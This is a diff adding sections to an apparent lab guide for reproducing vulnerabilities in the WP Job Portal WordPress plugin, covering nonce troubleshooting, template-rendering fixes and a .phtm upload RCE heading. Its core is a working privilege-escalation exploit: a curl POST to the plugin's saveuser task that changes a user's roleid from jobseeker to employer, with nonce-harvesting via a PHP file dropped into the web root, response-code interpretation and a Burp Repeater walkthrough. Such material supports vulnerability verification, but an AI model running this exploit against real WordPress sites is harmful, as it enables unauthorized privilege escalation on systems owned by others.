@@ -45,6 +45,11 @@ silently and `get_option('active_plugins')` returns `false`, causing a
 "critical error" white screen. **Always compute lengths programmatically**
 (see Python code above), never hardcode them.
 
+**How to detect this happened:** The plugin's shortcode shows as raw text
+(e.g., `[wpjobportal_job_search]`) instead of rendered content on the page.
+MySQL shows the option exists, but `get_option('active_plugins')` in PHP
+returns `false`.
+
 **Verify activation worked:**
 ```bash
 # CLI check (may fail if wp-cli still has FTP issue)
@@ -170,7 +175,136 @@ grep -r "phtm" /etc/php/ 2>/dev/null
 `.phtm` IS a PHP handler by default. This determines whether a `.phtm` upload
 is "arbitrary file upload" (file disclosure) or "RCE" (code execution).
 
-## 6. Proving RCE When Apache Doesn't Execute .phtm (PHP Built-in Server)
+## 6. WP Nonce Session Token Mismatch (CLI vs HTTP)
+
+**Symptom:** The exploit works perfectly via PHP CLI — `authorize()`
+returns TRUE, `storeUser()` succeeds, `roleid` changes from 2 to 1.
+But the same exploit via HTTP returns 403 "Access denied".
+
+**Cause:** WP nonces embed a **session-specific token** from the user's
+WP session (stored in `wp_session_tokens` user meta). A nonce generated
+in CLI via `wp_set_current_user(4)` + `wp_create_nonce("action")` produces
+a DIFFERENT value than the same user's nonce in an HTTP session. The CLI
+nonce is INVALID when sent via HTTP.
+
+**Key insight:** The `_wpnonce` in the WP admin bar (e.g., logout link)
+uses a DIFFERENT nonce action than the plugin's nonce. Extracting it and
+sending it to the plugin endpoint will fail with 403.
+
+**Fix — Generate nonce from the HTTP session:**
+```bash
+# Create a temp PHP file in the web root
+cat > /tmp/get_nonce.php << 'EOF'
+<?php
+require_once '/var/www/html/wordpress/wp-load.php';
+if (!is_user_logged_in()) die('not logged in');
+echo wp_create_nonce('wpjobportal_user_nonce');
+EOF
+
+# Copy to web root via Docker (files owned by www-data)
+docker run --rm -v /var/www/html/wordpress:/app -v /tmp:/tmp2 alpine \
+  sh -c "cp /tmp2/get_nonce.php /app/get_nonce.php"
+
+# Get nonce from HTTP session (strip PHP notices with tail -1)
+NONCE=$(curl -s -b cookies.txt 'http://target/get_nonce.php' | tail -1)
+
+# DELETE the temp file AFTER getting the nonce (not before!)
+docker run --rm -v /var/www/html/wordpress:/app alpine \
+  sh -c "rm -f /app/get_nonce.php"
+```
+
+**Success indicator:** HTTP 302 redirect = the controller executed
+`wp_redirect()` after `storeUser()` succeeded. HTTP 200 (homepage) =
+formhandler didn't dispatch. HTTP 403 = policy blocked (wrong nonce).
+
+## 6a. Full HTTP Exploit Verification Flow (Post-Nonce-Fix)
+
+After generating the correct HTTP session nonce (see §6 above), the full
+exploit verification flow is:
+
+**Step 1 — Reset DB state:**
+```bash
+mysql -u wpuser -p'PASSWORD' wordpress -e "UPDATE wp_wj_portal_users SET roleid=2 WHERE id=1;"
+```
+
+**Step 2 — Send exploit POST (do NOT follow redirects):**
+```bash
+curl -s -b cookies.txt -X POST \
+  "http://target/?wpjobportalme=user&action=wpjobportaltask&task=saveuser&_wpnonce=$NONCE" \
+  -d 'form_request=wpjobportal&id=1&roleid=1&wpjobportal_user_first=Jobseeker&wpjobportal_user_last=Test' \
+  -o /tmp/exploit_resp.html -w "HTTP: %{http_code}\n"
+```
+
+**Step 3 — Interpret response:**
+
+| HTTP Code | Meaning | Action |
+|-----------|---------|--------|
+| **302** | ✅ Exploit succeeded — controller ran `wp_redirect()` | Verify via UI diff |
+| **403** | ❌ Policy blocked — wrong nonce or nonce expired | Regenerate nonce |
+| **200** | ❌ Formhandler didn't dispatch — plugin not loaded | Check active_plugins |
+
+**Step 4 — Verify WITHOUT DB access (UI-based verification):**
+
+The exploit changes `roleid` from 2 (Jobseeker) to 1 (Employer). You can
+observe this by comparing page content before and after:
+
+```bash
+# BEFORE exploit (roleid=2): Jobseeker control panel shows 3 buttons
+curl -s -b cookies.txt 'http://target/wp-job-portal-jobseeker-controlpanel/' \
+  | grep -oP 'wjportal-cp-user-act-profile-[a-z-]*'
+# Output: add-resume, search-job, edit-profile (3 buttons)
+
+# AFTER exploit (roleid=1): Jobseeker control panel is EMPTY
+curl -s -b cookies.txt 'http://target/wp-job-portal-jobseeker-controlpanel/' \
+  | grep -oP 'wjportal-cp-user-act-profile-[a-z-]*'
+# Output: (empty — no jobseeker buttons because user is now employer)
+
+# Employer-only pages now accessible (HTTP 200 = access granted):
+curl -s -b cookies.txt 'http://target/?wpjobportalme=job&wpjobportallt=myjobs' \
+  -o /dev/null -w "My Jobs: %{http_code}\n"
+curl -s -b cookies.txt 'http://target/?wpjobportalme=company&wpjobportallt=mycompanies' \
+  -o /dev/null -w "My Companies: %{http_code}\n"
+```
+
+**Key insight:** When the exploit succeeds (302), the nonce is CONSUMED
+(24h TTL). Sending the same request again will return 403. Generate a
+new nonce for each test run.
+
+**Burp Suite workflow:**
+1. Paste the raw exploit request into Repeater
+2. Bấm Send → 302 = success
+3. Change method to GET, URL to `/wp-job-portal-jobseeker-controlpanel/`
+4. Send again → page should be EMPTY (no jobseeker buttons)
+5. Change URL to `/?wpjobportalme=employer&wpjobportallt=controlpanel`
+6. Send → HTTP 200 = employer access confirmed
+
+## 7. WP_Filesystem Blocking Template Rendering
+
+**Symptom:** Plugin CSS/JS loads (visible in `<link>` tags) but the
+plugin's form/template content is missing from the page. The shortcode
+shows as raw text or the page shows only the WP header/footer.
+
+**Cause:** The plugin's template includer calls
+`request_filesystem_credentials(site_url())` + `wp_filesystem($creds)`.
+Even with `define('FS_METHOD','direct')`, if WP_Filesystem isn't
+initialized before the plugin runs, template rendering fails silently.
+
+**Fix Option 1 — Patch the includer to use native file_exists():**
+```bash
+docker run --rm -v {plugin_path}:/app alpine sh -c "
+  sed -i 's|\$wp_filesystem->exists(|file_exists(|g' /app/includes/includer.php
+  sed -i 's|if ( ! function_exists( .WP_Filesystem.) {|if ( false) {|g' /app/includes/includer.php
+"
+```
+
+**Fix Option 2 — Initialize WP_Filesystem in wp-config.php:**
+Add BEFORE `require_once ABSPATH . 'wp-settings.php'`:
+```php
+require_once ABSPATH . 'wp-admin/includes/file.php';
+WP_Filesystem();
+```
+
+## 8. Proving RCE When Apache Doesn't Execute .phtm (PHP Built-in Server)
 
 **Symptom:** You've confirmed a `.phtm` file upload succeeds and the file is
 web-accessible (HTTP 200), but Apache serves the raw PHP source instead of
